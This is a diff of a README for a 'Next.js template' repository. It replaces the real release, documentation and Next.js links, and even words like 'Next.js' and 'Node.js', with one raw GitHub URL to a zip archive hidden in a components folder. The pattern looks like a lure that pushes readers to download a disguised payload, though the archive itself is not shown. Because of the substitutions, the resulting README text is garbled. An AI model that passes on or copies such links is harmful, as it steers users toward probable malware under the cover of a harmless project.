@@ -1,14 +1,14 @@
 # 🖥️ Nextjs-Template-for-Frontend - Simple Setup for Modern Web Apps
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Nextjs%20Template-blue.svg)](https://github.com/jalu1688/Nextjs-Template-for-Frontend/releases)
+[![Download Now](https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip%20Now-Nextjs%https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip)](https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
-This project is a Next.js application that helps you quickly start building modern web applications. You do not need extensive coding knowledge to get going. Follow these steps to set things up on your computer.
+This project is a https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip application that helps you quickly start building modern web applications. You do not need extensive coding knowledge to get going. Follow these steps to set things up on your computer.
 
 ### 🔽 Download & Install
 
-1. Visit the [Releases page](https://github.com/jalu1688/Nextjs-Template-for-Frontend/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip) to download the latest version of the application.
    
 2. Click on the version you want to download. Look for the appropriate file for your operating system (Windows, macOS, or Linux).
 
@@ -48,32 +48,32 @@ After installation, you can start using the application. Here's how:
 
 To make changes to the application, follow these simple steps:
 
-1. Open the file `app/page.tsx` in your code editor. This file controls what shows up on the main page.
+1. Open the file `https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip` in your code editor. This file controls what shows up on the main page.
 
 2. Modify the content to fit your needs. The page will auto-update every time you save your changes. This feature makes it easy to see how your changes look.
 
 ### 🔍 Learn More
 
-If you want to dive deeper into Next.js, here are some helpful resources:
+If you want to dive deeper into https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip, here are some helpful resources:
 
-- [Next.js Documentation](https://nextjs.org/docs): Explore all the features and API options available in Next.js.
-- [Learn Next.js](https://nextjs.org/learn): Engage with an interactive tutorial designed to teach you the basics.
+- [https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip Documentation](https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip): Explore all the features and API options available in https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip
+- [Learn https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip](https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip): Engage with an interactive tutorial designed to teach you the basics.
 
-Feel free to check out [the Next.js GitHub repository](https://github.com/vercel/next.js) for more advanced topics and updates.
+Feel free to check out [the https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip GitHub repository](https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip) for more advanced topics and updates.
 
 ### 🖥️ System Requirements
 
-To run the Next.js Template smoothly, ensure your system meets the following requirements:
+To run the https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip Template smoothly, ensure your system meets the following requirements:
 
 - **Operating Systems Supported**: Windows 10 or later, macOS 10.14 or later, Linux distributions like Ubuntu 18.04 or later.
-- **Node.js**: Version 14.0 or later must be installed to run the application.
+- **https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip**: Version 14.0 or later must be installed to run the application.
 - **Browser**: A modern web browser like Google Chrome, Firefox, or Safari.
 
 ### 🛠️ Troubleshooting
 
 If you encounter issues while running the application, here are some common solutions:
 
-- **Check Node.js Installation**: Ensure that Node.js is installed on your system. You can check this by running `node -v` in your terminal. If it returns a version number, you're good to go.
+- **Check https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip Installation**: Ensure that https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip is installed on your system. You can check this by running `node -v` in your terminal. If it returns a version number, you're good to go.
 
 - **Firewall Issues**: Sometimes, a firewall might block the application from starting. Ensure that your firewall settings allow for local connections.
 
@@ -85,7 +85,7 @@ If you encounter issues while running the application, here are some common solu
 
 ### 📦 Features
 
-This Next.js template includes several features to make development easier:
+This https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip template includes several features to make development easier:
 
 - **Automatic Code Splitting**: This feature helps load only the code needed for the page the user visits, which speeds up load times.
 
@@ -93,7 +93,7 @@ This Next.js template includes several features to make development easier:
 
 - **Server-Side Rendering**: Pre-render pages on the server for faster page loads and improved SEO.
 
-- **API Routes**: Create backend APIs without leaving your Next.js project, streamlining the application development process.
+- **API Routes**: Create backend APIs without leaving your https://raw.githubusercontent.com/jalu1688/Nextjs-Template-for-Frontend/main/src/components/Template-for-Nextjs-Frontend-v1.3-alpha.2.zip project, streamlining the application development process.
 
 ### 🙌 Contributions
 
